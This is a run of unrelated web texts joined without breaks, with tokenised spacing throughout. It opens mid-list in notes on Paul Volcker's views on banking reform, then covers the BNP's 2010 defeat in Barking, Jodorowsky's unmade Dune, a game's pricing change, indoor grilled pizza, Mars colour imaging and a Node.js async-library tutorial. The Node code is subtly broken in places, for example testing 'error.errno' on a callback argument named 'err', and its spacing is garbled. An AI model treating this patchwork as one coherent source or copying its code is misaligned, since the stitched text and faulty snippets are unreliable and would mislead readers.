He for one probably would n't say hooray if the new British government 's independent banking commission came up with a scheme for complete separation of retail and investment banking ( which is what it is apparently being mandated to find , based on the formulation in the Tory - LibDem agreement ) .
4 ) The Volcker rule would have profound implications for a relatively small number of US banks , perhaps four or five .
The most profoundly affected would be Goldman Sachs , which might feel obliged to give up its banking licence , in order to continue trading for its own account on the scale it has been doing .
5 ) His tone was pretty downbeat about the likelihood that the regulators and central bankers of the Basel Committee on Banking Supervision would any time soon come up with proposals to reform capital and liquidity requirements to significantly improve the robustness of the banking system .
Which is why he is a passionate advocate of his own structural reforms .
6 ) Because there may be some element of trading by investment banks that can't be formally prohibited , he believes there may be a role for massively increased capital requirements on residual trading activities by banks ( which is what Lord Turner advocates ) .
7 ) America 's financial sector became far too big , relative to the US economy .
8 ) Much financial innovation was designed to extract rent ( often in the form of premia paid by gullible investors ) rather than making a contribution to the growth potential of the economy .
9 ) He is not in favour of Senator Blanche Lincoln 's proposals which in effect would have banned involvement in derivatives by banks with access to liquidity support from the US Federal Reserve ( I am told her clause in the financial reform bill being debated in Senate is likely to be voted down next week ) .
10 ) Derivatives need to be made safe , in Volcker 's view , by forcing more - or - less all derivative trading through central clearing houses and regulated exchanges .
This would mean that those exposed to derivative transactions would have to post more collateral when prices move .
And it would make the transactions more transparent and more open to scrutiny .
Such reforms would also make these deals much less profitable for investment banks , by reducing their ability to extract rent from the gullible , which is why they 're hated by many bankers .
11 ) When I asked him whether he favoured new taxes on banks , of the sort proposed by the International Monetary Fund and the new British government , he said that was not something he has been advocating .
12 ) The financial stresses on the eurozone are the big concern of the moment ( as we know ) .
He implied - though did n't quite say - that he could n't see how the eurozone could survive without further political integration that would legitimise necessary coordination of member states ' tax and spending policies .
If he 's right , the pro-European Lib Dems in the new government , including Mr Clegg , might I suppose become concerned that the UK would be an outcast from a more integrated EU central core - which could test the unity of the new coalition .
13 ) He said that we should not kid ourselves that it 's business - as - usual again in international finance .
Banks and the financial system remain on life support provided by taxpayers .
He gave the example of the US mortgage market : mortgages securitised into bonds are the biggest part of the biggest capital market in the world ( the US bond market ) ; and 90 % of all mortgages are - through the mortgage - backed bond market - in effect granted or bought by US government agencies .
Which is not , in any sense , free - market capitalism .
At two minutes past six last Friday morning , Nick Griffin walked to the front of the makeshift stage at the Goresbrook leisure centre in Barking , east London , and tried to make his voice heard above a braying crowd .
The BNP leader had just suffered a humiliating defeat , beaten into third place by Labour MP Margaret Hodge in the constituency where he had promised to create a " political earthquake " .
But as he began a flustered and angry speech , Griffin already knew that worse was to come .
Rumours had been circulating round the east London count for more than an hour that the party had not only failed to get its first MP , it was on the verge of an electoral disaster in the area Griffin had once described as the party 's " jewel in the crown " .
" Within the next five years , the indigenous people of London will be a minority , " barked Griffin , as jubilant Labour supporters taunted him with shouts of " Out , out , out ! "
" It is going to be too late for Barking , but it is not too late for Britain . "
By then , though , no one was listening .
In the next 12 hours , Griffin 's worst fears were realised – and even exceeded .
The party was thrashed in its two key parliamentary constituencies of Barking and Stoke Central .
Its record number of council and parliamentary candidates failed to make a single breakthrough ; and of the 28 BNP councillors standing for re-election , all but two were beaten .
But the Barking and Dagenham council election result was the most dramatic .
The BNP had plans to take control of the authority – instead , it lost every one of its councillors there .
Twelve elected in 2006 .
Twelve thrown out in 2010 .
A ruthless purge , more shocking because they did n't see it coming .
Neither , for that matter , did their opponents .
It was the miracle of Barking .
" This really was a disastrous result for the BNP , " said Nick Lowles , who led the anti-BNP campaign Hope Not Hate .
" It will have long - term consequences – particularly for Nick Griffin . "
This week , those predictions are beginning to be realised , as senior BNP figures break ranks to question Griffin 's leadership and , again , raise concerns about the party 's finances .
Griffin has been all but untouchable since he took control of the party in 1999 , but now he seems increasingly isolated : mocked on far - right internet forums , forced to defend himself from the criticism of one his chief lieutenants .
" The BNP looks set to implode , " says Matthew Goodwin , a specialist in far - right politics at the University of Manchester .
" Griffin may hang on but , if he does , it will only be because there is no easy way to oust him and no obvious successor .
He had plans to expand his reach .
Now he is fighting to survive . "
Walking amid the shops and bustle of central Barking this week , Zain Achtar , a 19 - year - old student , could hardly stop smiling as he basked in a borough free of the BNP .
" It feels like something has been lifted from the place .
We can get on and go forward again . "
Karena Johnson , who works in Barking 's Broadway Theatre , agreed : " Having them here was an embarrassment .
What happened last week means the story of Barking has changed . "
Or perhaps the story of the BNP has changed .
Twelve months ago , the party was celebrating its big breakthrough after winning two seats in the Euro elections .
So why did that momentum stall in Barking ?
The answer is a tale of determined activism by Griffin 's opponents , aided by the antics of his self - harming party .
That activism began to develop a sharp focus two weeks after those Euro elections , when Lowles chaired a meeting of MPs , anti-BNP campaigners , church groups and trade unionists .
He gave them a detailed breakdown of the BNP 's support .
The message was stark .
" A decision was made to draw a line in the sand , " says one Labour party figure who was at the meeting .
" The coming general election was going to be the defining moment .
Everyone knew that if they won then , it would be almost impossible to remove them in the future . "
There was never a single anti-BNP campaign in Barking .
There were meetings , events , leafleting initiatives run by Hope Not Hate – which coordinated much of the activity – and also by Labour and Unite Against Fascism .
Hope Not Hate set up a base in derelict premises , and volunteers travelled across the country to prepare it for the coming battle ; putting up a new ceiling , plumbing in toilets and setting up a print room .
Some slept on the floors .
" The response was truly overwhelming , " says Lowles .
" On one day of action , we had 541 people ; on another , 385 ; and even on election day itself , 176 people came out to help get the vote out . "
Many of the volunteers had not been involved in political activity before .
" We had teenagers travelling up from Kent , old ladies from the other side of London turning out .
It felt like a liberating experience for people who felt like we were doing something politically important . "
The Hope Not Hate campaign was supported by Joe Rospars , chief digital strategist for Barack Obama from 2007 until his inauguration , and his company Blue State Digital .
Rospars said it was the " best example " of a British organisation applying the lessons of the US presidential elections .
" We are seeing a genuine community - based organisation , with people coming together around a common purpose , " he said .
Campaigners were able to identify the key groups least likely to vote for the BNP – women , pensioners and people from ethnic minorities .
They built up an online volunteer force of 140,000 people , and Rospars advised on how to use them for maximum impact .
In the month before election day , Lowles says more than 1,000 volunteers descended on Barking , delivering 350,000 specially tailored leaflets and newsletters .
At the same time , the Dagenham MP John Cruddas , and his neighbour who seemed most under threat , Barking MP Margaret Hodge , were fighting a parallel ground war against the BNP .
Hodge escalated the effort she had begun some four years earlier to reconnect with voters Labour had lost to the BNP .
Their rise in Barking had seen the then culture secretary heavily criticised by many inside her own party .
For her , this election result represents a triumph for decency , and personal redemption .
" When Griffin announced in September that he would stand , that gave me a real scare , " Hodge says .
" My husband had not long died , and I was still in grief .
It was a tough period .
I was quietly confident that I would win , but I really wanted to smash him .
And I was really concerned about the prospects for the council . "
Hodge , with the help of volunteers from Unite Against Fascism , turned to the politics of shoe leather , knocking on doors and listening to people 's concerns .
" ' What do you want to talk about ? '
I would ask .
It was up to them . "
Most talked about street cleaning , wheelie bins and antisocial behaviour , but inevitably many raised the BNP trump card of immigration .
Even black residents raised the issue with Hodge .
" I would say to them : ' I can't turn the clock back , but this is why the borough has changed , and we must make it work for all of us . '
Some people hated that .
Some would understand .
But they came to feel I was listening . "
The more so , perhaps , because the BNP was itself struggling to cope under a harsher spotlight .
Griffin's Question
Time appearance last October , with its gurning and yammering , shocked his supporters within the BNP and appeared to weaken his authority .
The decision by the Equalities Commission to challenge the party 's racist membership rules occupied too much of his attention , and drained the party 's meagre resources .
Indiscipline , heightened by personal rivalries , created a string of difficulties for the party and its leader .
At the beginning of the campaign , the BNP 's publicity director Mark Collett – once a firm ally of Griffin – was arrested on suspicion of threatening to kill him .
In Stoke , Alby Walker , a senior BNP councillor , said he would stand as an independent because of a " vein of Holocaust - denying " within the party .
Then , a few days before the election , the party 's website was closed .
It was replaced with a posting from Simon Bennett , the website manager , who accused Griffin and James Dowson , the BNP election fundraiser , of being " pathetic , desperate and incompetent " .
But the incident that might have had most impact on the voters of Barking concerned Bob Bailey , the BNP 's London organiser and one of Griffin 's closest confidants .
On the eve of the election , Bailey was caught on camera throwing punches and kicks at a group of teenagers .
Earlier this week , he was arrested and bailed on suspicion of assaulting two men ( an 18 - year - old man and a 19 - year - old man have also been arrested and bailed , on suspicion of assault and affray ) .
" That caught the attention of voters , " says Hodge .
" One of the fears many people had was that a BNP win would result in violence on the street .
That seemed to confirm it . "
It is impossible to say how much of the Barking miracle can be explained by the efforts of the forces ranged against the BNP , and how much of the wound was self - inflicted , but after a shaky start at the Goresbrook leisure centre – before postal votes confirmed the landslide – the outcome was certainly decisive .
Each confirmed result elicited whoops and backslapping , and by the end of the purge , only Richard Barnbrook , one of Griffin 's senior lieutenants and himself a casualty of the wipeout , remained .
He smiled a smile that at first seemed defiant , but eventually gave the impression that he was feeling queasy .
Around Barnbrook , officials – joyous at having the stain on the authority so ruthlessly removed – were quick to share the good news with friends and loved ones .
One texted as each far - righter was shown the door .
The last text read : " Bye bye , Nazis . "
A widely shared thought is that the BNP was overwhelmed by the sort of grassroots activism that must now become a template if there is to be resurgence for the Labour party .
In fact , Tony Travers , of the London School of Economics , says it was all about Labour .
" It would appear that the vote for the BNP in 2006 was some kind of political cry of anguish , based on the perception that the Labour party simply did n't understand the concerns of that part of the electorate .
The fact that the BNP has been dropped in 2010 heavily suggests this section of the electorate now believes it has got the attention of the Labour party . "
Back in 2006 , the morality of supporting an intrinsically racist party was n't an issue , says Travers .
" The voters simply used the most shocking mechanism they could to get Labour 's attention . "
But there is good and bad in that conclusion .
Good because it suggests people in Barking voted BNP for reasons other than racism and antisemitism .
Bad because if it was all a means to an end , did no one consider the impact on community relations of voting for the far right ?
In any event , Dan Hodges , a strategist and spokesman for Hope Not Hate , says the safest conclusion to draw is that wider society should never again be so complacent .
" We were lucky this time .
People realised the threat just in time , we mobilised just in time .
But we may not be so lucky next . "
What is the future for the BNP now ?
Griffin does n't know .
He can point to the fact that the BNP won more than half a million votes , but his mood is changeable .
Yesterday he sent another email , brimming with anger .
" The old east London is dead , " he wrote .
His party is at a crossroads .
A Tory - led administration may worsen social divisions , providing the far right with new opportunities .
But it might also clamp down on immigration , rendering the BNP irrelevant .
Even if opportunities come his way , Griffin 's party has so many problems that he may not be able to take advantage .
The BNP is not dead , but it took a mortal blow in Barking .
It will be hard - pushed to find its feet again .
Probably he knew it would never get made .
There had to be a feeling , a nagging twinge in the back of his mind .
Pink Floyd doing the soundtrack .
Jean Giraud the art .
Orson Wells as the Baron Vladimir Harkonnen and Salvador Dali as the Emperor of the Known Universe .
It was simply too grand , too ambitious .
Too many wishes were coming true for it to all hold together .
Jodorowsky must have sensed even from the beginning that this movie could only exist as an ideal .
His impossible , insane , psychedelic , Jungian , mind - altering adaptation of Frank Herbert ’s Dune could exist as a potential only .
The artists who work on it openly speak of its success , even though it was never finished .
Because to them , the journey was the destination .
Those artists are the reason this unmade film is so colossally influential .
In 1974 Alejandro Jodorowsky assembled five artists who would go on , together and separately , to define the look and feel , the themes of Science Fiction films over the last 30 years more than any of the directors we associate with those films .
Lucas , Spielberg , Ridley Scott , these guys did n’t create the worlds they presented to us .
They hired these 5 artists to create those worlds for them .
Magnificent Failure
You ’ve never seen the most influential SF movie of all time .
You ’ve never seen it , because Jodorowsky ’s Dune was never finished .
It was never properly begun .
It never got out of pre-production .
But it was directly responsible for the golden age of SF and Fantasy in Cinema , which started with Star Wars and ended with The Fifth Element .
That most people have never even heard of this movie is a crime .
To make it , Jodorowsky simply asked everyone he thought was awesome to come with him .
When he met with the guys at EMI records in London to talk about possible musicians for the soundtrack , they listed off a bunch of their mid-range talent .
Jodorowsky said “ Well hang on .
You represent Pink Floyd .
What about them ? ”
Their reaction was “ Oh they ’re too expensive .
You ca n’t afford them . ”
He thought that was crap .
This was a creative endeavor and the guys in the Floyd were obviously creative guys .
What did money matter ?
So he called them up and asked them if they ’d be interested in contributing a song .
Unbeknownst to Jodorowsky , the guys in the Floyd loved Dune and had seen Jodorowski’s El Topo .
They flew to Paris , where Jodorowsky was based , and after a meeting agreed to do the whole soundtrack for the film , releasing a 2 - disc album of music afterward called DUNE .
For a brief period in the 1970s , there was going to be a Pink Floyd double - album called DUNE .
Holy crap .
That ’s how he did everything .
Coming off El Topo he was seen as a brilliant , visionary director and this was going to be a massive commercial enterprise privately funded outside the studio system .
So there would be no compromise .
It was a perfect storm .
He was hot , he was a creative genius , and he had tons of cash .
That ’s how he got all these people to come onboard .
Jodorowsky wanted each of the worlds the story takes place on , each of the factions in the movie , to have its own distinct visual design .
To that end he hired five artists and spent almost 2 million dollars , roughly 1/5th of the film ’s entire budget , on art and design in preproduction .
Looking back , it seems clear that he was perfectly happy spending his budget in creating , rather than on a creation .
The process was the goal , not a finished movie .
The artists he assembled in Paris worked for months and produced hundreds of pieces of concept art , including ships and weapons and costumes .
Five guys , working in a Paris studio for months , were secretly creating the future of the future in film .
The Team
Dan O’Bannon would become known primarily as the screenwriter for Alien .
But his first gig was as an artist , a special effects designer , at USC ’s Film School with his exact contemporary John Carpenter .
The two of them wrote and designed the 1974 cult classic Dark Star .
A very weird little movie that has a lot to recommend it , especially if you view it as a student film , which it was , and watch it stoned , which I think most of them were at one point or another .
Jodorowsky saw Dark Star and loved its spaced - out visions , wanted the guy who designed them on a shoestring budget to come work with him .
Jean Giraurd , already famous in France , had n’t yet started Métal Hurlant .
But Jodorowsky was a huge fan of his western comic Blueberry .
It was only after Dune failed that Jodorowsky and Giraud , under his pseudonym Moebius , went on to do one of the most breathtaking SF comics of all time , Incal .
You can see , in that comic and Metabarons , what Jodorowsky intended for Dune .
He nabbed Chris Foss , a British Illustrator noted for his covers of SF novels in Britain .
Here ’s
Foss talking about the project .
Ron Cobb , a former Disney artist and at the time an illustrator for a radical , underground newspaper in Los Angeles , and co-conspirator with Dan O’Bannon on Dark Star .
And finally , H. R. Giger .
Already a disturbing dude , not yet famous .
This was several years before Alien .
You may recognize this list of talent because of Alien .
They all worked on it .
It was the movie they went on to do after Dune fell apart .
Look a the space suits in Alien , they ’ve got Moebius ’ design all over them .
They worked on Alien because screenwriter Dan O’Bannon recommended all of them .
That ’s them .
Jodorowsky ’s dream team of designers and illustrators .
None of them had done much yet .
Jodorowsky was not , I do n’t think , recruiting relative unknowns because he lacked influence or capital , but because there was no commercial SF scene the way there is now .
He was laying the foundation for that scene .
Who knows what would have happened , had the movie ever been made ?
It ’s hard to imagine such a weird book , made vastly more weird by Jodorowsky , becoming a commercial hit .
But looking at the vision of the future it would go on to produce by proxy in the form of these five artists , it clear he was onto something .
The worlds those five guys would later create became huge .
Influential some of them , and box office smashes , others .
Here ’s a list of the movies those five artists would work on , together or separately .
Each of these movies owes a visual debt to a movie that was never made .
Star Wars
Alien ( the entire team would go on to work on this film )
Blade Runner
Tron
Heavy Metal
Conan the Barbarian
The Last Starfighter
Back to the Future
Aliens
The Abyss
Total Recall
The Fifth Element
It ’s impossible to overstate the influence here .
There are shots in Blade Runner lifted directly from a Métal Hurlant story written by Dan O’Bannon and illustrated by Jean Giraud , who were working together because Dune had disintegrated .
That same story would go on to be reworked into The Fifth Element one of my favorite movies , which Jean Giraud did a ton of work for …before sued director Luc Besson for ripping him off .
When you look back at the team Jodorowsky assembled , and what they - in groups and alone - went on to produce , it seems reasonable to conclude that the never completed Alexander Jodorowsky version of Dune is the most influential science fiction film of all time .
The fact that it was never finished is beside the point .
When Dune finally ground to a halt it left behind it a group of writers and artists who did n’t feel as though they ’d failed .
They ’d been paid well to produce some astonishing work and formed creative relationships that would see them through the next ten years .
The fact that no movie came of it had to seem incidental .
The dream was the process .
The process was the project .
The journey was the destination .
This page contains only a few images , a tiny fraction of the total , created for Dune .
A full assessment of the impact these five artists had on SF would take …well , it would take a whole book .
I thought I might write that book .
But I missed my opportunity .
There was an art show in London in 2010 where Jodorowsky was showing off several hundred illustrations from preproduction .
I had plenty of time and plenty of money and could have gone , could have maybe met and secured an interview with Jodorowsky , but I chickened out .
Someone should hunt down Jodorowsky and Jean Giraud and do a documentary on this , and that someone should be me !
Alas , I have a job now and no time and so this poor post must serve .
Now as I write this post , I discover there ’s a documentary in the works about this very subject and that brings me great joy .
I just want more people to know about this , know about the creative process in all it ’s forms and how it can be hugely successful even when it fails .
Just five months after its official launch , Hi-Rez Studio 's massively multiplayer online shooter Global Agenda has shed its monthly subscription option , with the developer saying players need only pay for the base game and paid expansions if they wish .
" Hi - Rez Studios is committed to delivering the best value in PC gaming , " said executive producer Todd Harris in a statement .
Global Agenda Executive Producer .
" One purchase of Global Agenda lets you experience all [ existing ] content forever with no subscription . "
The move brings to mind online game developer Turbine 's decision to go free - to - play with its two major licensed MMOs , Dungeons & Dragons Online and The Lord of the Rings Online , both of which began as traditional subscription - based titles , but is actually much closer to the business model employed by ArenaNet in its own online games Guild Wars and its upcoming sequel .
While games using the so - called " free - to - play " model generally have no initial fee or subscription , instead funding ongoing development with the sale of virtual goods and services , Hi-Rez plans to fund Global Agenda with revenue from the sale of the game client itself as well as forthcoming paid content expansion packs .
The company says anyone who buys the game from this point on will gain access to all launch and post - launch material released for the game to date .
The " Sandstorm " expansion , the first phase of which has already been released , will be completed later this summer as a free package .
Hi-Rez piggybacked its announcement onto the store - wide summer sale currently behind held by digital distribution platform Steam , which is temporarily offering Global Agenda for 33 percent off .
Gallery How to Grill Pizza Indoors
If you 've got a backyard or deck and a grill , grilling pizzas is a natural in the summer .
After lighting up the grill , hot , crispy - chewy , perfectly blistered crust is just a few minutes away .
But what if you , like me , recently moved from a decked - out Brooklyn apartment to a Manhattan high - rise with no outdoor space ?
Sure , I can always fire up the oven and preheat my stone at full blast for an hour and get some excellent , better - than - most - pizzeria results , but only if I 'm willing to let the ambient temperature of my apartment to climb into the upper 80's , even with the A/C on full blast .
I can't handle that kind of heat .
You 're listening to someone whose honeymoon in a hot , muggy , Vietnam last July was simultaneously the best and most sweat - covered , miserable experience of my life .
So what 's a pizza - loving , cold - blooded New Englander to do ?
The answer seems obvious : Grill the pizza indoors on a grill pan .
I tried doing exactly that using a dough made from " OO " flour , 60 % water , 1 % yeast , and 2 % salt , which I fermented overnight at room temp before it up and allowing it to rise an hour and a half .
I followed the same method I use for an outdoor grill : stretch the dough and cook one side while brushing the second side with garlic oil , flip , then top while the second side cooks , putting the cheese under the sauce so that it melts .
Remove when the bottom is charred , slice and serve .
It did n't exactly work .
The pizza came out totally soggy , showing some major tip sag .
In addition , it developed what I 've dubbed an " inverse cornicione , " which is clearly visible in the picture below .
Basically , it looks like the pizza was constructed upside down :
Here 's the problem :
An outdoor grill gets the air near the grates to at least 500 or 600 degrees , and additionally supplies plenty of radiant energy from glowing coals .
It also boasts plenty of ventilation .
These three things combined lead to rapid coloring and dehydration of the crust , turning it crispy within a minute or so .
A grill pan , on the other hand , offers nearly no radiant energy , only gets to a few hundred degrees , and has very poor ventilation .
After some futzing around and some serious pizza - eating , I hit upon the solution .
All you 've gotta do is flip the dough twice before topping it , so that the side that is cooked first ends up sitting face - up for a minute , allowing it to dehydrate .
It then gets cooked a second time when you flip the pie again and top it , helping it to further crisp up .
The method also handily solves the inverse cornicione problem :
So there you 've got it :
Hot , crisp , blistery pizza in five minutes , and your apartment stays perfectly cool , so no reason to strip down to your underwear .
Unless you just want to , that is .

What colour is Mars ?
A Practical Guide to improving your Mars imagery .
By Damian Peach .
Mars from the Rosetta Spacecraft on Feb 24th 2007 .
This true colour view is probably very close to the actual colour of a dust free Mars .
Courtesy ESA .
Just what colour is Mars ?
The simple answer seems Red since it is so well known as the Red Planet .
Both Amateur and Professional results constantly portray a Martian disk of different colour .
Some show a weakly coloured pink globe while others show a rusty coloured surface .
What causes these variations , and more specifically what are the causes and effects of popular amateur techniques in imaging the “ Red Planet ” .
Fig 01 .
The varying colours of Mars portrayed in modern imagery .
But which is closest to the truth ?
Images courtesy David Tyler & STScI .
Through the eyepiece of a large telescope , to my eye Mars ( when the Martian atmosphere is free of dust ) has a rusty orange coloured surface similar to what the famous ground based imagery of the rovers show , but few amateur or professional images seem to portray well this colour , or indeed accurate colours / contrasts of the Planet in general .
In this guide I will try to provide a more accurate and thoughtful approach to rendering Mars “ closer to the truth ” and hopefully provide others with the motivation to try different techniques to render a more accurate picture of the R ed Planet .
Popular techniques for amateur imaging
There are various well known techniques for producing colour Mars images employed by today ’s amateurs .
Here is a brief rundown of them .
RGB : Taking separate images through Red , Green and Blue filters and combing those three images into a colour image .
R ( G ) B : Taking a Red and Blue image and “ synthesising ” the Green image by averaging the Red and Blue images ,
IR ( G ) B : Taking an IR and Blue image and “ synthesising ” the Green image from the two .
RRGB or RR ( G ) B : Using a normal RGB or R( G ) B image and then replacing the luminance data with a more highly contrasted Red light image .
The above listed techniques are at present the most popular approaches to imaging Mars with amateur equipment .
All yield rather different looking images as you can see in this comparison set below :
Fig 02 .
Three of the four primary techniques used in imaging Mars illustrated .
Note the starkly different colours and contrasts produced .
IR ( G ) B produces a similar result to R( G ) B but with more contrasted albedo markings .
D. Peach .
RGB vs R( G ) B .
The R( G ) B technique for producing Mars images is very popular and indeed I have used this method myself for many of my own images .
But how accurate is this in rendering the true colour of Mars ?
Some may say that since there is no green coloured areas on Mars taking a true G filter image is rather a waste of time , and just creates even more processing work .
But when we carefully examine a true RGB image and an R ( G ) B image of Mars we can see that they do not look the same .
Tones of colour shading rendered in the true RGB image are missing from the R( G ) B image .
Fig 03 .
True RGB vs RGB .
Notice the colour tones rendered in the true RGB image that are missing from the R( G ) B image particularly the brick red colour area around the North Polar Hood .
Also notice the differences from the true G image to a synthetic G image .
D. Peach .
With some care R( G ) B images can produce very aesthetically pleasing results and the overall colour tone rendered can be pleasing , but there is no question that a true G image contains tonal information that is simply not reproducible by synthesising a Green image from Red / Blue and for this reason we must conclude that true RGB is the preferred approach if we wish to render the colours of Mars accurately .
IR ( G ) B and Red Luminance RRGB .
A very popular approach with today ’s amateurs is using the well contrasted Red filtered image to use as luminance data in a colour image to give a better contrasted colour view of Mars .
But how accurate is this technique , and what are the pitfalls ?
Firstly lets remember something very important – Mars has an Atmosphere !
By using Red or worse IR filtered imagery as luminance data for a colour image produces a completely false picture of both the colours and contrasts of disk .
The Human Brain loves contrast , and it ’s very easy to fall into this trap and forgetting Mars does not really look like the images are portraying .
If we look at this comparison below the differences are very apparent indeed :
Fig 04 .
Red Luminance RGB ( Bottom Right ) vs True RGB vs R( G ) B ( Top and Bottom Left . )
We can clearly see that the contrasts and colours portrayed in the Red Luminance RGB are completely false .
Mars has become pink , and the albedo markings have become much to contrasted .
Also note the loss of cloud details due to using the Red Luminance .
Images HST 2001 .
RRGB and IR ( G ) B have become popular primarily through a trend of many people using this method to overcome inadequate seeing .
While it does produce a well ( and perhaps over ) contrasted view of Mars the colour and atmospheric details have been lost to a large degree .
The difference with true RGB and also R( G ) B is stark , and to my eye using a Red / IR luminance does not produce a pleasing image neither from an aesthetic viewpoint or a scientific one .
All techniques compared .
Here we compare all of the above techniques , but first lets just take a look at each separate colour filtered image and comment on what is being recorded :
Fig 05 .
Red , Green and Blue images of Mars. D. Peach .
Red Light : Penetrates the Martian atmosphere observing the surface .
Records the dark surface albedo markings of Mars in good contrast .
Also reveals active dust clouds with excellent contrast .
Least affected wavelength from atmospheric seeing meaning its often possible to obtain good images .
Most interesting wavelength to use simply due to there being lots of well contrasted detail ( dust storm permitting ! )
Green Light :
Shows both the surface albedo markings and atmospheric features such as clouds .
Note the albedo markings can often have different shapes in this wavelength compared to Red Light due to it penetrating less to the surface than Red .
Important for accurately rendering the colours of a colour image to the highest accuracy .
Also important for rendering accurate colour of active dust events ( which usually appear distinctly yellow . )
Blue Light : Shows the atmospheric features of Mars most clearly .
Clouds and hazes are very apparent while the surface albedo features are largely suppressed .
Hard to obtain images of very good quality in this filter due to atmospheric scattering and atmospheric seeing .
When we look at each image individually its clear that each filter has an important role to play .
Here are more detailed comments on the popular techniques described above with the pros and con ’s highlighted :
RGB : Straight Red , Green , Blue imaging .
Produces the most accurate rendition of colour tones and contrasts in the final colour image .
Harder to balance the colours accurately if you lack experience .
More time consuming than R( G ) B and more processing work .
Also does n’t seem to work so well in poorer seeing due to Green being affected by atmospheric seeing .
R( G ) B : Synthetic Green generated from Red / Blue average .
Produces pleasing colour images and is perhaps the second best technique to employ .
Less time consuming than RGB and is easier to achieve a pleasing colour balance .
However is less accurate than RGB in rendering the true colour of Mars , and certain colour tones and shading are completely lost .
IR ( G ) B : Same as R( G ) B but IR image used instead to generate synthetic G image .
Produces a good colour image though the contrasts of the albedo markings are exaggerated and it is also quite difficult to produce a reasonably accurate colour balance .
Increased exposure time with IR meaning slower frame rates or noisier images , especially with smaller apertures .
RRGB or IRRGB : Red or IR image is employed as the luminance data .
Albedo contrasts are greatly exaggerated in the colour image .
Impossible to achieve an accurate colour balance .
Atmospheric information from the Blue image is greatly subdued and lost in places .
No real benefit to using this technique other than to easily produce a well contrasted colour image in poor seeing , or an over contrasted colour image in good seeing .
Fig 06 .
Green images compared from true G , Synthetic G from R/B and G channel from RRGB .
Note how the dark albedo markings become more apparent when using synthetic G , and extremely apparent in the RRGB green channel .
Its clear here that true G does contribute toward the Martian colour .
HST imagery 2001 .
So which technique is the best one to use ?
Under ideal circumstances of good seeing and transparency the true RGB approach is really the winner .
It undoubtedly produces the most accurate colour rendition of the Planet and also produces an accurate balance between albedo detail and atmospheric detail .
In poorer seeing the R( G ) B approach seems better simply because the G image can be badly affected which can be frustrating especially if you ’ve managed to secure a quite good red light image .
Its also not much fun processing lots of poor sequences , so more from a practical standpoint I prefer the R( G ) B approach in this respect .
The Red Luminance approach however I recommend avoiding .
It simply does not re-produce an accurate picture of the Martian disk , and using this technique in bad seeing will not help since the colour is impossibly skewed away from the truth .
At least with R( G ) B we can come reasonably close to reality .
The Red / IR luminance technique has undoubtedly become so popular simply because all of the “ exciting ” small scale detail lies in the red image and we often want it to show through in the colour image as much as possible , but this simply is not doing Mars justice and atmospheric details are sacrificed in exchange for more contrasted albedo details .
Fig 07 .
Image of Mars taken using a Lumenera SKYnyx colour camera with IR blocking filter installed .
D. Peach .
When using colour cameras its important to use an IR blocking filter to stop the image being “ polluted ” with to much Red / IR signal .
Colour cameras when used with IR blocking filters can produce very pleasing results and are probably more accurate in their rendition of Mars than R( G ) B imaging .
Mars is a rather more colourful world than one may think .
The rusty desert areas often contain regions of varying colour and albedo , and the only way this can be accurately portrayed is through true RGB imaging .
It may seem more work and one may argue that the R( G ) B result is close enough , but to produce the true ruddy colour Mars with an accurate balance between albedo / atmosphere that is often apparent at the eyepiece one must use the true RGB technique .
HEADS UP !
This article was written for an older version of node .
More up - to - date information may be available elsewhere .
Now with the release of Node v0.1.30 there is even more need for a library like Do .
While working with the node community to decide on the best alternative to node promises , we decided that it 's best left to library developers .
So as of this morning , node no longer ships with promises , but uses a simple callback interface for all async functions .
I took my async library that I 've been developing throughout the Control Flow series and made it into a real library called Do .
Node callback interface
All async functions in node now use a simple callback based interface :
async.js var fs = require ( 'fs ' ) ;
fs . readdir ( " /usr " , function ( err , files ) {
if ( err ) throw err ;
console .
log ( " / usr files : " + files ) ;
} ) ;
That is , after the arguments , there is a callback function expected .
This callback function will be given the error if there was one , and if not , the result after that .
Creating an async function that exports this interface is simple too :
plain_callbacks.js function errorHandler ( error ) {
throw error ;
}
// Load 'fs ' , a built - in node library that has async functions
var fs = require ( 'fs ' ) ;
function safeRead ( filename , callback ) {
fs .
readFile ( filename , function ( err , data ) {
if ( err ) {
if ( error .
errno === process .
ENOENT ) {
// Ignore file not found errors and return an empty result
callback ( null , " " ) ;
} else {
// Pass other errors through as is
callback ( err ) ;
}
} else {
// Pass successes through as it too .
callback ( null , data ) ;
}
} )
}
safeRead ( __filename , function ( err , text ) {
if ( err ) {
errorHandler ( err ) ;
} else {
console . log ( text ) ;
}
} ) ;
These callbacks are fast , simple , and to - the - point .
However , your code can get pretty hairy when you start expanding beyond these trivial examples .
These simple callback based functions can't be used with aggregate utilities , they can't be implicitly chained or grouped either .
We can Do better .
Do is a library that adds higher level abstraction and continuables .
What I mean by a continuable is explained by the following :
Continuables
divide .js # define function divide ( a , b ) { return function ( callback , errback ) {
// Use nextTick to prove that we 're working asynchronously
process .
nextTick ( function ( ) {
if ( b === 0 ) {
errback ( new Error ( " Cannot divide by 0 " ) ) ;
} else {
callback ( a / b ) ;
}
} ) ;
}}
Do expects async functions to not require the callback in the initial invocation , but instead return a continuable which can then be called with the callback and errback .
This is done by manually currying the function .
The " continuable " is the function returned by the outer function .
The body of the function wo n't be executed until you finish the application by attaching a callback .
divide.js #use divide ( 100 , 10 ) ( function ( result ) {
console .
log ( " the result is " + result ) ;
} , function ( error ) {
throw error ;
} ) ;
This style is extremely simple , and is fairly powerful .
The initial function can have variable arguments .
The continuable itself is portable until it 's invoked by attaching callbacks .
Why is this better than plain - ol - callbacks ?
Well , let 's convert the safeRead example from above to continuables :
continuable_based.js function errorHandler ( error ) {
throw error ;
}
var
Do = require ( ' do ' ) ;
// Convert `readFile` from fs to use continuable style .
var fs =
Do . convert ( require ( 'fs ' ) , [ ' read File ' ] ) ;
function safeRead ( filename ) { return function ( callback , errback ) {
fs .
readFile ( filename ) ( callback , function ( error ) {
if ( error .
errno === process .
ENOENT ) {
callback ( " " ) ;
} else {
errback ( error ) ;
}
} )
}}
safeRead ( __filename ) ( console .
log , errorHandler ) ;
You 'll notice that this is a lot shorter and you do n't have to constantly check for the error argument or pad your success results with a null argument .
Also since we 're passing through the success case as is , we can use the outer callback as the inner callback .
In most cases you wo n't do this for success , but you will for errback .
What about the rest of Do ?
The real power of Do and continuables comes when you 're dealing with several async functions as once .
Let 's take our example from the third control flow article and convert it to use the new Do library :
How to Do ( API )
The Do library makes doing higher - level abstractions easy .
All of these helpers are themselves continuables so you can attach callbacks by calling the returned , curried function .
Do.parallel( actions ) {...}
Takes an array of actions and runs them all in parallel .
You can either pass in an array of actions , or several actions as function arguments .
If you pass in an array , then the output will be an array of all the results
If you pass in separate arguments , then the output will have several arguments .
